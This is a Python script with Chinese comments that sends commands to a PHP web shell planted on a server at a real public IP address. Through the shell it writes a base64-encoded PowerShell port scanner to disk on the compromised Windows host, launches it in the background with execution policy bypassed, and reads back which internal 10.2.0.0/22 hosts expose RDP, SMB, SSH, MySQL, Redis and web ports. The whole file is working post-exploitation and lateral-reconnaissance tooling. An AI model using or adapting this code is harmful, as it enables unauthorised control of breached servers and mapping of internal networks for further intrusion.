#!/usr/bin/env python3
"""PowerShell 并发端口扫描 (81.70原生, 无需传文件)
用 Runspace 并发池, 200线程, 扫 10.2.0.0/22 关键端口
"""
import urllib.request, urllib.parse, time

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=90):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# PowerShell 脚本: 用 TcpClient 异步 + 并行
ps = r'''
$ports = @(80,443,3306,3389,22,445,6379,8080,9096)
$out = "C:/phpScan/lat_ps.txt"
Remove-Item $out -ErrorAction SilentlyContinue
$results = New-Object System.Collections.Concurrent.ConcurrentQueue[string]
$ips = @()
for($b=0;$b -le 3;$b++){ for($i=1;$i -le 254;$i++){ $ips += "10.2.$b.$i" } }
$script = {
  param($ip, $ports)
  foreach($p in $ports){
    $c = New-Object System.Net.Sockets.TcpClient
    $r = $c.BeginConnect($ip, $p, $null, $null)
    $ok = $r.AsyncWaitHandle.WaitOne(300)
    if($ok -and $c.Connected){ Write-Output "$ip`:$p" }
    $c.Close()
  }
}
$jobs = @()
foreach($ip in $ips){
  if($ip -eq "10.2.0.4"){ continue }
  $jobs += Start-Job -ScriptBlock $script -ArgumentList $ip,$ports
  if($jobs.Count -ge 50){
    $jobs | Wait-Job -Timeout 10 | Out-Null
    foreach($j in $jobs){ Receive-Job $j | Add-Content $out; Remove-Job $j }
    $jobs = @()
  }
}
$jobs | Wait-Job -Timeout 20 | Out-Null
foreach($j in $jobs){ Receive-Job $j | Add-Content $out; Remove-Job $j }
Add-Content $out "#PS_DONE"
'''
import base64
b64 = base64.b64encode(ps.encode("utf-16-le")).decode()

# 写 ps1 文件 (用 php -r 写字节)
code = f"system('C:/phpStudy/php/php-5.4.45/php.exe -r \"file_put_contents(\\\"C:/phpScan/lat.ps1\\\", base64_decode(\\\"{b64}\\\"));\" 2>&1');print_r('W:' . filesize('C:/phpScan/lat.ps1'));"
r = cmd(code, 30)
print("1. 写ps1:", r.strip()[-60:], flush=True)

# 后台启动 powershell
code2 = "pclose(popen('start /b cmd /c \"powershell -NoProfile -ExecutionPolicy Bypass -File C:/phpScan/lat.ps1 > C:/phpScan/lat_ps.log 2>&1\"', 'r'));print_r('PS_STARTED');"
r = cmd(code2, 25)
print("2. 启动:", r.strip()[-40:], flush=True)
time.sleep(30)
r = cmd("print_r(file_get_contents('C:/phpScan/lat_ps.txt'));", 20)
print("3. 30秒:", r.strip()[-400:], flush=True)
